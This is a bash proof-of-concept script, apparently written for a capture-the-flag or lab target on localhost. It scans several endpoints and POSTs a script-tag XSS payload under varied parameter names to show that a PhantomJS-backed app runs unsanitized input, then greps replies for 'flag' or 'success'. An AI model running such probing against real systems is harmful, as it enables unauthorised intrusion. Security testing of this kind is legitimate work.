#!/bin/bash

# POC: Insecure Subprocess Execution - XSS in PhantomJS Context (v2)
# This demonstrates that user-controlled content is executed by PhantomJS without sanitization

TARGET="http://localhost:5000"
echo "[*] Testing PhantomJS XSS Injection Vulnerability"
echo "[*] Target: $TARGET"
echo ""

# First, discover available endpoints by checking root
echo "[*] Step 1: Discovering available XSS endpoints..."
DISCOVER=$(curl -s "$TARGET/")
echo "Root response preview:"
echo "$DISCOVER" | head -20
echo ""

# Based on evidence, try common XSS endpoints
ENDPOINTS=("/" "/xss" "/xss2" "/xss3" "/xss4" "/check")

for endpoint in "${ENDPOINTS[@]}"; do
    echo "[*] Testing endpoint: $endpoint"
    
    # Test with GET request first
    GET_RESPONSE=$(curl -s -w "\nHTTP_STATUS:%{http_code}" "$TARGET$endpoint")
    GET_CODE=$(echo "$GET_RESPONSE" | grep "HTTP_STATUS:" | cut -d: -f2)
    
    if [ "$GET_CODE" == "200" ] || [ "$GET_CODE" == "405" ]; then
        echo "[+] Endpoint $endpoint exists (Status: $GET_CODE)"
        
        # Try POST with XSS payload
        echo "[*] Attempting POST with XSS payload..."
        
        # Try different parameter names
        for param in "xss" "content" "page" "input" "data"; do
            PAYLOAD='<script>alert("XSS_TEST")</script>'
            POST_RESPONSE=$(curl -s -w "\nHTTP_STATUS:%{http_code}" -X POST "$TARGET$endpoint" \
              -H "Content-Type: application/x-www-form-urlencoded" \
              --data-urlencode "$param=$PAYLOAD" 2>&1)
            
            POST_CODE=$(echo "$POST_RESPONSE" | grep "HTTP_STATUS:" | cut -d: -f2)
            POST_BODY=$(echo "$POST_RESPONSE" | grep -v "HTTP_STATUS:")
            
            if [ "$POST_CODE" == "200" ]; then
                echo "[+] POST successful with parameter '$param' (Status: $POST_CODE)"
                echo "Response:"
                echo "$POST_BODY"
                echo ""
                
                # Check for indicators of script execution/processing
                if echo "$POST_BODY" | grep -qi "flag\|congrat\|success\|found\|detected\|executed"; then
                    echo "[+++] VULNERABLE: Application processed the JavaScript payload!"
                    echo "[+++] Evidence: Response indicates script execution was detected"
                    echo ""
                fi
            fi
        done
    fi
    echo "---"
done

echo ""
echo "========================================="
echo "[*] POC Completion Summary"
echo ""
echo "This POC attempts to demonstrate that user-supplied content"
echo "containing JavaScript is processed by PhantomJS without proper"
echo "sanitization, leading to XSS execution in the PhantomJS context."
echo ""
echo "Vulnerability: Unsanitized user input -> HTML file -> PhantomJS execution"
echo "Impact: XSS, potential data access, DoS via resource-intensive scripts"
echo "========================================="